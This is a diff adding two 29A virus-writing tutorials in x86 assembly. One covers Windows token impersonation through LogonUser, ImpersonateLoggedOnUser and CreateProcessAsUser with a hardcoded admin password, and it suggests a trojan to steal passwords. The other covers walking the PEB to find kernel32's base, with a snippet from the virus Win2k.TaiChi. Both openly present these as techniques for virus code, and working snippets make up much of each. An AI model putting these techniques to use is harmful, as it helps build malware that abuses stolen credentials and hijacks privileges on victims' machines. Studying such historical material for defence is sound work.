@@ -1,0 +1,352 @@
+
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[IMPERSONATION.TXT]컴�
+			.Impersonation, your friend.
+				.by Ratter/29A.
+
+.Intro.
+Imagine a situation. You're running under security context of non administrator
+user but you have the admin password (how to gain it see my next article). You
+have the privileges you need and now you are thinking about what I will do with
+it? The answer for you is impersonation.
+
+Let's have a look at MSDN definition of impersonation:
+- Impersonation is the ability of a thread to execute using different security
+information than the process that owns the thread. -
+
+There exist a lot of types of impersonation eg DDE, a named-pipe, RPC
+impersonation etc. Generally impersonation is used when the server needs to 
+act for while as the client. But we will use this method to declare our thread
+as an admin one and to create admin processes ...
+
+
+.Needed privileges.
+If you want to impersonate running thread the only privilege you need is the
+SeTcbPrivilege. However if you want to create a new process under the 
+different security context you need SeAssignPrimaryTokenPrivilege, 
+SeIncreaseQuotaPrivilege and SeTcbPrivilege too.
+
+A impersonation scenario may look like this:
+	your virus is runned under the administrator user account.
+	it adds needed privileges to everyone and installs a trojan
+	to get admin passwords. later, when runned under normal
+	user account it impersonates the admin one and worx normally
+	as it would be runned under admin account.
+
+
+.Administrator check.
+First of all you might want to know whether your process runs under the member
+of the administrator group account or not (it's useless to impersonate admin
+when you're amin too :)) This little code snippet may help you ...
+
+
+- Admin Check -
+;-----------------------------------------------------------------------------
+; CheckTokenMemberShip function is in advapi32.dll
+; If used for an impersonated token, won't return a valid result
+
+        SECURITY_BUILTIN_DOMAIN_RID     equ	20h
+	DOMAIN_ALIAS_RID_ADMINS        	equ	220h
+	SECURITY_NT_AUTHORITY           equ	5
+
+; out: eax - bool
+is_caller_admin	proc	near
+        pushad
+        @SEH_SetupFrame <jmp is_caller_admin_end>
+
+        @pushvar <dd	?>
+	pop eax
+	and dword ptr [eax], 0
+	push eax
+	push eax
+	align 4
+	call $+24
+	db	0ffh, 25h, 60h
+	db	1			; create admin member SID
+	db	2
+	db	0, 0, 0, 0, 0, SECURITY_NT_AUTHORITY
+	dd	SECURITY_BUILTIN_DOMAIN_RID
+	dd	DOMAIN_ALIAS_RID_ADMINS
+	add dword ptr [esp], 3
+	push 0				; check the token of running thread
+	call CheckTokenMembership	; for admin SID
+
+	pop eax
+	mov eax, dword ptr [eax]
+
+is_caller_admin_end:
+	@SEH_RemoveFrame
+	mov dword ptr [esp.Pushad_eax], eax
+	popad
+	retn
+is_caller_admin	endp
+;-----------------------------------------------------------------------------
+
+
+.Running thread impersonation.
+Let's have an account "administrator" with the password "fucker". First of all
+we have to log in this user. For this we will use the LogonUser function which
+is exported by advapi32.dll. Let's have a look at the prototype:
+
+BOOL LogonUser(
+  LPTSTR lpszUsername,    // user name
+  LPTSTR lpszDomain,      // domain or server
+  LPTSTR lpszPassword,    // password
+  DWORD dwLogonType,      // type of logon operation
+  DWORD dwLogonProvider,  // logon provider
+  PHANDLE phToken         // receive tokens handle
+);
+
+In phToken we will recieve the tokens handle which we'll need later. Logon
+provider will be null (ie default). Logon type is LOGON32_LOGON_INTERACTIVE
+and password and user name is obvious. Domain will be null. Now let's see the
+code.
+
+- Loging in an user -
+;-----------------------------------------------------------------------------
+        LOGON32_LOGON_INTERACTIVE	equ	2
+
+        @pushvar <htoken	dd	?>
+        push 0
+        push LOGON32_LOGON_INTERACTIVE
+        @pushsz "fucker"
+        push 0
+	@pushsz "administrator"
+	call LogonUserA
+;-----------------------------------------------------------------------------
+
+If everything went fine we have a impersonation token. Now we will use the
+ImpersonateLoggedOnUser function which will finally declare our thread as
+and impersonated one. The function takes one parameter - token.
+
+- Impersonating an user -
+;-----------------------------------------------------------------------------
+        push dword ptr [htoken]
+	call ImpersonateLoggedOnUser
+;-----------------------------------------------------------------------------
+
+Now our thread runs under the administrator privileges. We can do all we need
+and later, when we are finished with admin stuff we want to get back our own
+security context just call RevertToSelf function ...
+
+- Reverting back - 
+;-----------------------------------------------------------------------------
+	call dword ptr [ebp+tRevertToSelf]
+;-----------------------------------------------------------------------------
+
+
+.Creating a new process under impersonated security context.
+First of all we have to log in as in previous case. Just use the same code
+as presented in - Loging in an user -. We will use the CreateProcessAsUser
+function which is again exported by advapi32.dll. This api is almost the same
+as CreateProcess but it takes one param more - token.
+
+
+- Creating an admin process -
+;-----------------------------------------------------------------------------
+	GMEM_ZEROINIT		equ	040h
+
+        push type(PROCESS_INFORMATION)+type(STARTUPINFO)
+        push GMEM_ZEROINIT
+	call GlobalAlloc
+	xchg eax, ebx
+
+	xor eax,eax
+	push ebx
+	push ebx
+	add dword ptr [esp], type(PROCESS_INFORMATION)
+	push eax
+	push eax
+	push eax
+	push 1
+	push eax
+	push eax
+        @pushsz "cmd.exe";
+	push eax
+        push dword ptr [htoken]
+        call CreateProcessAsUserA
+		
+	push ebx
+	call GlobalFree
+
+	push dword ptr [htoken]
+	call CloseHandle
+;-----------------------------------------------------------------------------
+
+This snippet will run an instance of command intepreter which will run under
+under administrator security context ...
+
+
+.Closing.
+As you might see impersonation is a very powerfull thingy. The only weak point
+are the passwords. But if you find a good way to get the password (eg a trojan
+horse) then it will be your best friend :)
+
+
+--
+Ratter/29A - I'm a stranger in the world I haven't made.
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[IMPERSONATION.TXT]컴�
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[PEB.TXT]컴�
+		.Gaining important datas from PEB under NT boxes.
+				.by Ratter/29A.
+
+.Intro.
+After some years of using it, you are very familiar with SEH - Structured
+Exception Handling. When you set a exception frame you use more or less
+the same code snippet which works with the fs selector. Probably you also
+know that this selector points to a data structure known as TEB ie
+Thread Environment Block. This structure contains a lot of more or less useful
+values and structures and - what is important for us - also a pointer to
+PEB - Process Environment Block.
+
+struct TEB {
+	struct _NT_TIB NtTib;
+	void* EnvironmentPointer;
+	struct _CLIENT_ID ClientId;
+	void* ActiveRpcHandle;
+	void* ThreadLocalStoragePointer;
+	struct _PEB* ProcessEnvironmentBlock;	; offset 30h
+	....
+	struct _ACTIVATION_CONTEXT_STACK ActivationContextStack;
+};
+
+This is also the first use of PEB in virus coding. Since PEB under NT is
+always mapped at address 7FFDF000h (ie below 80000000h becoz above is the
+memory occupied by the NT kernel and drivers) but under Win9x it is always
+above 80000000h in the shared memory region we can use it for differentiating
+these operating system families. See this code snippet from Win2k.TaiChi:
+
+- Operating system families differentiating -
+;-----------------------------------------------------------------------------
+	mov eax, dword ptr fs:[30h]	; gimme the PEB pointer
+	test eax, eax			; it is above 80000000h ?
+	js jmp_to_host			; if yep end ...
+					; runned under WinNT box
+;-----------------------------------------------------------------------------
+
+
+.Getting the kernel32.dll base from PEB.
+For us will be important two data structures in PEB - PEB_LDR_DATA and
+RTL_USER_PROCESS_PARAMETERS. First we will use PEB_LDR_DATA which is at PEB:0ch
+offset to locate the kernel32.dll image base.
+
+struct PEB_LDR_DATA {
+	DWORD Length;						; 0
+	BYTE Initialized;					; 4
+	void* SsHandle;						; 8
+	struct LIST_ENTRY InLoadOrderModuleList;		; 0ch
+	struct LIST_ENTRY InMemoryOrderModuleList;		; 14h
+	struct LIST_ENTRY InInitializationOrderModuleList;	; 1ch
+};
+
+struct LIST_ENTRY {
+	struct LIST_ENTRY* Flink;	; 0
+	struct LIST_ENTRY* Blink;	; 4
+};
+
+On the first sight it could look out a little bit confusing. But it isn't
+believe me. Let's have a deeper look at the PEB_LDR_DATA structure. For our
+needs we will use that data structure at address PEB:PEB_LDR_DATA:1ch. This
+is the list of initialization order of modules (ie dlls). Because it is the
+LIST_ENTRY what in fact is the two ways list (forwards and backwards) we'll
+go forward to the first module in the list. If we would need image base of
+ntdll.dll this would be the right entry for us. But because we want the
+kernel32.dll image base we go forward again and that's exactly what we need.
+Let's have a look at the code snippet (hope it will be less confusing :))
+
+- Getting kenel32.dll image base -
+;-----------------------------------------------------------------------------
+	mov eax, dword ptr fs:[30h]	; PEB base in eax
+        mov eax, dword ptr [eax+0ch]	; goto PEB_LDR_DATA
+
+        mov esi, dword ptr [eax+1ch]	; get the first entry in the
+        				; InitOrderModuleList
+	; now the esi points to the LIST_ENTRY entry which also contains
+	; (besides others) the image base of ntdll.dll
+	; *esi
+	;	dd	*forwards_in_the_list	; esi+0
+	;	dd	*backwards_in_the_list	;    +4
+	;	dd	imagebase_of_ntdll.dll  ;    +8
+	;	...
+	;	dd	imagetimestamp		;    +44h
+
+
+        lodsd				; we go forwards
+ 	mov ebx, dword ptr [eax+08h]	; and finally we get the image base
+ 					; of kernel32.dll
+;-----------------------------------------------------------------------------
+
+We can of course go forward again in the list and then we could find
+informations about other modules in the chain (if other we're imported by
+the program of course ...)
+
+
+.Getting the current directory from PEB.
+Now the time has come to have a look at RTL_USER_PROCESS_PARAMETERS structure.
+This structure is located at PEB:10h. First let's have a look at it's entries.
+
+struct RTL_USER_PROCESS_PARAMETERS {
+	DWORD MaximumLength;
+	DWORD Length;
+	DWORD Flags;
+	DWORD DebugFlags;
+	void* ConsoleHandle;
+	DWORD ConsoleFlags;
+	void* StandardInput;
+	void* StandardOutput;
+	void* StandardError;
+	struct CURDIR CurrentDirectory;
+	struct UNICODE_STRING DllPath;
+	struct UNICODE_STRING ImagePathName;
+	struct UNICODE_STRING CommandLine;
+	void* Environment;
+	DWORD StartingX;
+	DWORD StartingY;
+	DWORD CountX;
+	DWORD CountY;
+	DWORD CountCharsX;
+	DWORD CountCharsY;
+	DWORD FillAttribute;
+	DWORD WindowFlags;
+	DWORD ShowWindowFlags;
+	struct UNICODE_STRING WindowTitle;
+	struct UNICODE_STRING DesktopInfo;
+	struct UNICODE_STRING ShellInfo;
+	struct UNICODE_STRING RuntimeData;
+};
+
+struct CURDIR {
+	struct UNICODE_STRING DosPath;
+	void* Handle;
+};
+
+struct UNICODE_STRING {
+	WORD Length;
+	WORD MaximumLength;
+	DWORD* Buffer;
+};
+
+As you might see there is a lot of very usefull datas. For example CommandLine,
+StandardInput, StandardOutput and others. We will use this structure to get the
+current directory. Because it's not a lot to explain let's go directly to the
+code snippet.
+
+- Getting current directory -
+;-----------------------------------------------------------------------------
+	mov eax, dword ptr fs:[30h]	; goto PEB
+	mov eax, dword ptr [eax+10h]	; goto RTL_USER_PROCESS_PARAMETERS
+	add eax, 24h			; goto CurrentDirectory
+	mov eax, dword ptr [eax+4]	; gimme unicode_buffer
+	; now in eax we have the pointer to the unicode current directory
+	; you can convert it to ansi or work with it as it is ...
+;-----------------------------------------------------------------------------
+
+
+.Closing.
+You could see, that in PEB but also in TEB there are a lot of useful informations.
+A lot of functions of Win32 api are touching exactly these structures. Go on
+with exploring them with reverse engineering (mainly ntdll.dll) and show us
+what you'll get ...
+
+--
+Ratter/29A - I'm a stranger in the world I haven't made.
+컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴[PEB.TXT]컴�
